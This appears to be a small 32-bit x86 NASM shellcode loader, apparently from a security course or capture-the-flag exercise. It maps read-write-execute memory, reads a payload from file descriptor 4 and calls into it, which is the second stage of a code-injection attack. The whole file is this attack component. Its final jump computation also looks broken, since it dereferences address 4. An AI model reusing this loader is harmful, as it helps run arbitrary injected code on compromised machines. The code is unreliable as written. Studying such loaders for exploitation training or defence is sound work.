	;; Evan Jensen
	;; Kai Wen Zhong
	;; 030913
	;; Shellcode Loader
	;; mmap2 = 0xc0, read = 3,


;;   eb034:       8b 5c 24 14             mov    ebx,DWORD PTR [esp+0x14] 
;;   eb038:       8b 4c 24 18             mov    ecx,DWORD PTR [esp+0x18]
;;   eb03c:       8b 54 24 1c             mov    edx,DWORD PTR [esp+0x1c]
;;   eb040:       8b 74 24 20             mov    esi,DWORD PTR [esp+0x20]
;;   eb044:       8b 7c 24 24             mov    edi,DWORD PTR [esp+0x24]
;;   eb048:       8b 6c 24 28             mov    ebp,DWORD PTR [esp+0x28]

	;; EBX, ECX, EDX, ESI, EDI, EBP
	%define LEN word 0xffff	;TODO make this larger
	
BITS 32	
global main
	
main:
				; mmap
	xor eax, eax
	mov ebp, eax        ;offset, 0
	mov ebx, eax        ;addr, NULL
	xor ecx, ecx
	mov cx, LEN      ;length, 0xffff
	mov edx, eax
	mov dl, 0x7         ;prot, PROT_READ | PROT_WRITE | PROT_EXEC
	xor esi, esi
	mov al, 0x22
	mov si, ax          ;flags, MAP_PRIVATE | MAP_ANONYMOUS
	mov edi, -1         ;fd, -1
	mov al, 0xc0        ;Call number
	int 0x80
	
				;read
	xor ebx, ebx
	mov bl, 0x04        ;fd, ???
	mov ecx, eax        ;buf, mmap()
	xor edx, edx	
	mov dx, LEN      ;count, 0xffff
	xor eax,eax
	mov al,3
	int 0x80

	mov eax, ebx
	add eax, [ebx]
	add eax, 4          ;Offset to the code!
	
				;Everything dies
	call eax
